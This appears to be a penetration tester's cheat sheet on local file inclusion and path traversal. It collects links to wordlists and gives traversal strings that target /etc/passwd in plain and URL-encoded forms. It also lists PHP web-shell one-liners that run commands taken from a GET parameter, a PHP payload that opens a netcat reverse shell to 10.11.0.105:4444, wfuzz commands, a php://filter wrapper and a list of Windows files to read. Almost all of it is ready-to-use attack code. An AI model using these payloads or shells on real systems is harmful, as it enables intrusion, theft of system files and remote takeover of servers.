- - -
### 🐶️ **Wordlists** **:**

- [LFI-Payload-List](https://raw.githubusercontent.com/emadshanab/LFI-Payload-List/master/LFI%20payloads.txt)
- [SecLists](https://github.com/danielmiessler/SecLists/tree/master/Fuzzing/LFI)
- [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/File%20Inclusion/Intruders)
- Best Guide : [0xffsec](https://0xffsec.com/handbook/web-applications/file-inclusion-and-path-traversal/) ,  [Hacktricks-LFI](https://book.hacktricks.xyz/pentesting-web/file-inclusion)
- [Sirensecurity.io](https://sirensecurity.io/blog/file-inclusion-reference/)
- By HackTricks ( [Windows](https://github.com/carlospolop/Auto_Wordlists/blob/main/custom_wordlists/file_inclusion_windows.txt) )
- By Hacktricks  ( [Linux/Unix](https://github.com/carlospolop/Auto_Wordlists/blob/main/custom_wordlists/file_inclusion_linux.txt) )
- [FuzzLists Wordlists](https://github.com/fssecur3/fuzzlists)

- - -
### Basic Bypasses : 

```python
# Simple Tries :-
../../../../../../etc/passwd
../../../../../../etc/passwd%00
..//..//..//..//..//..//etc/passwd
..//..//..//..//..//..//etc//passwd
....//....//....//....//etc//passwd
..///////..////..//////etc/passwd
......///......///......///......///......///......///etc/passwd
......///......///......///......///......///......///etc////passwd
```

### URL-Encoded : 

```php
..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd
..%252F..%252F..%252F..%252F..%252F..%252F..%252Fetc%252Fpasswd
..%25252F..%25252F..%25252F..%25252F..%25252F..%25252F..%25252Fetc%25252Fpasswd
/%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../etc/passwd

#Try Burp-Suite's Decoder for URL encode ( It encodes '..' also ) Like this :-
%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%65%74%63%2f%70%61%73%73%77%64
```

Also try this one.

```sh
echo -n "non_existing_directory/../../../etc/passwd/" && for i in {1..2048}; do echo -n "./"; done
```
```python
non_existing_directory/../../../etc/passwd/./././.[./ REPEATED ~2048 times]
```

> [!hint] 
> **In PHP**:  `/etc/passwd` **=** `/etc//passwd` **=** `/etc/./passwd` **=** `/etc/passwd/` **=** `/etc/passwd/`
- - -


- - -
## Useful Payloads : 

```php
<?php echo shell_exec($_GET['cmd']);?>
<?php echo passthru($_GET['cmd']);?>
<?php echo system($_GET['cmd']);?>
<?php echo exec($_GET['cmd']);?>
<?php echo popen($_GET['cmd']);?>

eval("phpinfo();");
eval("passthru('id');");
```

```php
<?php
echo shell_exec("nc.exe 10.11.0.105 4444 -e cmd.exe");
?>

<?php
echo "<pre>";
echo shell_exec("nc.exe 10.11.0.105 4444 -e cmd.exe");
echo "</pre>";
?>
```


- - -
## Fuzzing :

####  Finding Parameters Name : 
```sh
wfuzz -u http://10.10.10.10/image.php?FUZZ=/etc/passwd -c -w /opt/seclists/Discovery/Web-Content/api/objects.txt
``` 

#### Finding Files : 

```sh
wfuzz -c -z file,/usr/share/seclists/Fuzzing/LFI/LFI-Jhaddix.txt --hh 0 "$URL/index.php?id=FUZZ"
```


- - -
### String Filters 🎁 🎁 🎁 

#### Base64 Filters

```php
php://filter/convert.base64-encode/resource=
```

- - -
### Common Windows Files : 

**Accessible By  Everyone :**
```sh
file=C:\windows\system32\drivers\etc\hosts

file=../../../../../boot.ini
```

- - -